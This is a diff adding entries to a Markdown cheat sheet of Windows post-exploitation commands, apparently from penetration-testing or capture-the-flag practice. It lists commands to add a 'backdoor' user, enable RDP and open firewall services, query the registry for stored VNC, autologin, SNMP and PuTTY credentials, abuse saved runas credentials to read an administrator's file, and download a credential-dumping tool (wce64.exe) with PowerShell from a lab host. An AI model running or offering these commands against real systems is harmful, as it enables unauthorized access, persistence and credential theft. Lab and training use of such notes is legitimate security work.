@@ -21,6 +21,10 @@
 
 `net use`
 
+`net share`
+
+`net view`
+
 ### Add user
 `net user backdoor backdoor123 /add`
 
@@ -69,12 +73,49 @@ windows service requires the executable to send back some feedback call within 3
 
 there are few workarounds on this, the easiest way is simply wrap your command in cmd.exe. i.e, cmd.exe /k <ur command>.
 
+### RDP Enable
 
 We can enable remote desktop from windows command line by running the following command:
 
 reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
 
+netsh firewall set service remoteadmin enable
+netsh firewall set service remotedesktop enable
+net start termservice
 
 
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 
 
+
+### Look for password in registry
+
+#### VNC
+reg query "HKCU\Software\ORL\WinVNC3\Password"
+
+#### Windows autologin
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
+
+#### SNMP Paramters
+reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"
+
+#### Putty
+reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
+
+#### Search for password in registry
+reg query HKLM /f password /t REG_SZ /s
+reg query HKCU /f password /t REG_SZ /s
+
+### runas
+runas /user:DOMAIN\user cmd.exe
+
+runas /savecred /user:access\administrator "cmd /c type c:\users\administrator\desktop\root.txt > c:\users\security\y.txt"
+
+
+#### check files in directories
+
+tree /f /a
+
+#### File Download
+
+powershell -command "& { (New-Object System.Net.WebClient).DownloadFile('http://10.10.10.10/wce64.exe', 'c:\HFS\wce64.exe')}"
 
